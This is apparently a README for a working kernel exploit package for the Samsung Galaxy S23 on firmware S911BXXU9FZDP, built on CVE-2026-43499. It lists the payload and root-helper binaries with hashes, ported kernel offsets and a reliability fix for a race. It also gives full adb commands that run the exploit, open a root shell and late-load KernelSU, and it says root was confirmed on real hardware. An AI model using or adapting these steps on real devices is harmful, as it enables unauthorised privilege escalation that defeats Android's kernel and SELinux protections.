# dm1q-S911BXXU9FZDP artifacts

Exact-profile payload and helper for Galaxy S23 `SM-S911B` on firmware
`S911BXXU9FZDP` (kernel `5.15.189-android13-8-33413713-abS911BXXU9FZDP`).

## Files

| File | Size | SHA-256 |
| --- | --- | --- |
| `cve-2026-43499-app.so` | 130608 | `a07763b0268dd424d1097d996c94759e7589ada81e05c3879852912b22cd541d` |
| `cve-2026-43499-root` | 25912 | helper (see note below) |

## KernelSU

| File | Size | SHA-256 |
| --- | --- | --- |
| `../kernelsu/android13-5.15.189_kernelsu-dm1q-S911BXXU9FZDP.ko` | 356928 | `7a1c5565f52e66d8263d1a3046062bcfde32bab2807a607f4fdff9f0287813d9` |
| `../kernelsu/ksud-dm1q-S911BXXU9FZDP-kdp` | 4879560 | `07302e5a79cc6c57d23a06cbb996c2f31c50c29589c03cf40278cfe43ab92639` |

The `ksud` binary is byte-identical to the FZE1 build (`07302e5a…`). This is
intentional: KernelSU's `late-load` path uses its kallsyms-aware manual loader
(plain `insmod` is not supported), which does **not** verify `vermagic`, and the
detected KMI (`android13-5.15`) is identical between FZE1 and FZDP. The
standalone `.ko` is provided with the exact FZDP `vermagic`
(`…abS911BXXU9FZDP`) for auditing / future use.

## How the profile was derived

- `target.h` = FZE1 profile with only the data offsets that differ on FZDP
  updated from the exact FZDP `Image` kallsyms:
  - `KMALLOC_CACHES_OFF` `0x02064638` → `0x02064ab8`
  - `ANON_PIPE_BUF_OPS_OFF` `0x01e7f620` → `0x01e7faa0`
  - `ASHMEM_FOPS_OFF` `0x0200d678` → `0x0200daf8`
  - `SLIDE_NFULNL_LOGGER_NAME_OFF` `0x01d5de56` → `0x01d5e2d6`
- `p0_fingerprint.h` regenerated from the exact FZDP raw `Image` at probe
  `0x1f0000` (`tools/generate_p0_fingerprint.pl`).
- All text/function offsets and the tracefs caller gates are identical to FZE1.

## Reliability fix (v2)

The shipped `root.c` now retries the UMH publish up to 8 times when the
`system_unbound` worker pool's worklist changes right before queueing (a race
with real kernel work items on that shared pool). Previously that race aborted
the run with `root umh worklist changed before queue` / `Payload execution
failed: 255`. Same fix as the FZE1 profile.

## Manual (adb) usage

```bash
adb push cve-2026-43499-app.so /data/local/tmp/dm1q.so
adb push cve-2026-43499-root /data/local/tmp/cve-2026-43499-root
adb shell chmod 755 /data/local/tmp/cve-2026-43499-root

adb shell "SLIDE_SOURCE=tracefs EXPLOIT_ATTEMPTS=1 \
  P0_ATTEMPT_TIMEOUT_SEC=115 EXPLOIT_ATTEMPT_TIMEOUT_SEC=600 \
  /data/local/tmp/cve-2026-43499-root --run-payload \
  /data/local/tmp/dm1q.so /data/local/tmp/cve-2026-43499-root \
  /data/local/tmp/dm1q-fzdp.log"

adb shell "/data/local/tmp/cve-2026-43499-root -c 'id; getenforce'"

# KernelSU late-load
adb push ksud-dm1q-S911BXXU9FZDP-kdp /data/local/tmp/ksud-s25u-kdp
adb shell chmod 755 /data/local/tmp/ksud-s25u-kdp
adb shell "/data/local/tmp/cve-2026-43499-root -c \
  'cp /data/local/tmp/ksud-s25u-kdp /data/local/tmp/.ksud-stage; chmod 755 /data/local/tmp/.ksud-stage'"
adb shell "/data/local/tmp/cve-2026-43499-root --late-load"
adb shell "su -c id"
```

## Status

- Exploit profile derived and build-verified (byte-reproducible).
  **Device-tested**: root + KernelSU confirmed on `S911BXXU9FZDP` hardware
  (one attempt per boot; root is volatile).
